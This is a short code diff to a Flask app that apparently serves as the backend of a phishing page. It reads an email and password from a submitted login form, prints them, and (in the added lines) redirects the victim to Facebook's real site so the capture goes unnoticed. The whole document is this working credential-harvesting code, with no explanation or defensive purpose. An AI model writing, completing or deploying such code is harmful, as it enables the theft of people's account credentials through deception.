@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request
+from flask import Flask, render_template, request, redirect
 
 app = Flask(__name__)
 
@@ -9,10 +9,12 @@ def pagina_inicial():
 @app.route("/pega_dados", methods = ["POST"])
 
 def pega_dados():
-    email = request.form.get("file")
-    senha = request.form.get("password")
+    email = request.form.get("email")
+    senha = request.form.get("pass")
 
     print (f"email: {email} \n senha: {senha}")
+
+    return redirect("https://www.facebook.com/?locale=pt_BR")
 
 
 app.run()
